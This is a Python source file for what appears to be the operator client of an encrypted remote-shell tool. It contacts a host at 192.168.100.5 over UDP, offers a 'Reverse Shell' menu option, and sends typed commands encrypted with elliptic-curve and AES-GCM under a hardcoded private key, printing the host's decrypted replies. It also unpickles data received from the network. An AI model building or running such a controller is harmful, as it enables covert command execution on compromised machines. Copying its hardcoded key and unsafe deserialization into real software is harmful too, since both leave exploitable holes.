import socket
import sys
from tinyec import registry
import tinyec.ec as ec
from Crypto.Cipher import AES
import hashlib, secrets, binascii
import pickle

curve = registry.get_curve('brainpoolP256r1')


def encode(message):
    return message.encode()

def decode(message):
    return message.decode("utf-8")

def encryptAES(msg, secretkey):
    aesCipher = AES.new(secretkey, AES.MODE_GCM)
    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
    return (ciphertext, aesCipher.nonce, authTag)

def decrypt_AES_GCM(ciphertext, nonce, authTag, secretKey):
    aesCipher = AES.new(secretKey, AES.MODE_GCM, nonce)
    plaintext = aesCipher.decrypt_and_verify(ciphertext, authTag)
    return plaintext

def eccTo256BitKey(point):
    sha = hashlib.sha256(int.to_bytes(point.x, 32, 'big'))
    sha.update(int.to_bytes(point.y, 32, 'big'))
    return sha.digest()

def encryptECC(message, pubkey):
    ciphertextPrivKey = secrets.randbelow(curve.field.n)
    sharedECCKey = ciphertextPrivKey * pubkey
    secretKey = eccTo256BitKey(sharedECCKey)
    ciphertext, nonce, authTag = encryptAES(message, secretKey)
    ciphertextPubKey = ciphertextPrivKey * curve.g
    return (ciphertext, nonce, authTag, ciphertextPubKey)

def decryptECC(encryptedMsg, privkey):
    (ciphertext, nonce, authTag, ciphertextPubKey) = encryptedMsg
    sharedECCKey = privkey * ciphertextPubKey
    secretKey = eccTo256BitKey(sharedECCKey)
    plaintext = decrypt_AES_GCM(ciphertext, nonce, authTag, secretKey)
    return plaintext

def main():
    msgFromClient = "HELLO"
    bytesToSend = encode(msgFromClient)
    serverAddressPort = ("192.168.100.5", 8123)
    bufferSize = 1024
    UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    UDPClientSocket.sendto(bytesToSend, serverAddressPort)

    msgFromServer = UDPClientSocket.recvfrom(bufferSize)
    print(decode(msgFromServer[0]))
    choice = ""
    while choice != "1":
        print("""Options:\n
            1.) Reverse Shell
            2.) [TODO - Add other options]""")
        choice = input()
    inp = ""
    while not inp == "JHDONE":
        inp = input()
        inp = "JH" + inp
        cmd=inp.encode()
        #privkey = secrets.randbelow(curve.field.n)
        privkey = 55523049895079075860098996757830212235119640612963685438975685046735125749529
        pubkey = privkey * curve.g
        encryptedMsg = encryptECC(cmd, pubkey)
        encryptedMsgObj = {
            'ciphertext': encryptedMsg[0],
            'nonce': encryptedMsg[1],
            'authTag': encryptedMsg[2],
            'ciphertextPubKeyX': encryptedMsg[3].x, 
            'ciphertextPubKeyY': encryptedMsg[3].y
        }
        if choice == "1":
            encryptedMsgObj['type'] = "001"

        bytesToSend = pickle.dumps(encryptedMsgObj)
        UDPClientSocket.sendto(bytesToSend, serverAddressPort)

        bytesAddressPair = UDPClientSocket.recvfrom(bufferSize)
        responseMsgObj = bytesAddressPair[0]
        responseMsgObj = pickle.loads(responseMsgObj)
        responseMsg = (responseMsgObj['ciphertext'], responseMsgObj['nonce'], 
            responseMsgObj['authTag'], ec.Point(curve, responseMsgObj['ciphertextPubKeyX'], responseMsgObj['ciphertextPubKeyY']))
        try:
            response = decode(decryptECC(responseMsg, privkey))
        except:
            response = "Error decoding command :: invalid key"
        print(response)

main()